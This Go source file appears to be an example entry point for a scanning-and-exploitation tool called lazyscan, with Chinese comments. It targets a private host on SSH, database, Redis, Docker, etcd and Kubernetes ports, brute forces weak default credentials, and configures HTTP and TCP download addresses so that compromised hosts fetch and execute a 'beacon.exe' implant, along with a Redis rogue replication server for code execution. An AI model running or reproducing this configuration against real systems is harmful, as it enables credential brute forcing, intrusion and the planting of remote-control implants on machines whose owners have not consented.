package main

import (
	"fmt"
	"strings"

	"github.com/404tk/lazyscan/common/queue"
	"github.com/404tk/lazyscan/runner"
)

func main() {
	options := &runner.Options{
		Host:             "172.16.61.2",                           // 扫描目标
		HostFile:         "",                                      // 扫描目标批量文本
		Ports:            "22,1433,2375,2379,3306,5432,6379,6443", // 扫描端口
		NoPing:           false,
		Scantype:         "all",
		Timeout:          3,
		Threads:          600,
		LiveTop:          10,
		HTTPDownloadAddr: "http://192.168.1.2:8080/beacon.exe", // HTTP文件下载地址
		TCPDownloadAddr:  "192.168.1.2:8553/beacon.exe",        // TCP文件下载地址
		FileName:         "beacon.exe",                         // 文件缓存名称，默认路径为/tmp/
		ExecCommand:      "beacon.exe",                         // 文件执行命令，可以添加参数，如：beacon.exe -url http://192.168.1.7/
		RedisRogueServer: "192.168.1.2:6380",                   // redis主从复制监听端口
		Userdict: map[string][]string{
			"mysql":      {"root"},
			"ssh":        {"root"},
			"mssql":      {"sa"},
			"postgresql": {"postgres"},
		},
		Passwords: []string{"123456", "{user}", "{user}@123"},
		PortList: map[string]string{
			"ssh":           "22",
			"mssql":         "1433",
			"docker-remote": "2375",
			"etcd":          "2379",
			"mysql":         "3306",
			"postgresql":    "5432",
			"redis":         "6379",
			"kube-api":      "6443",
			"all":           "0",
		},
	}
	resultQueue := queue.NewQueue() // 扫描结果队列
	runner := runner.New(options)
	result := runner.Enumerate(resultQueue)
	// ICMP存活IP
	fmt.Println("AliveHosts:", strings.Join(result.AliveHosts, ", "))
	// 开放端口
	fmt.Println("AlivePorts:", strings.Join(result.AlivePorts, ", "))
	// 漏洞结果汇总
	vulns := resultQueue.Dump()
	fmt.Println("Vulns:", strings.Join(vulns, ", "))
}
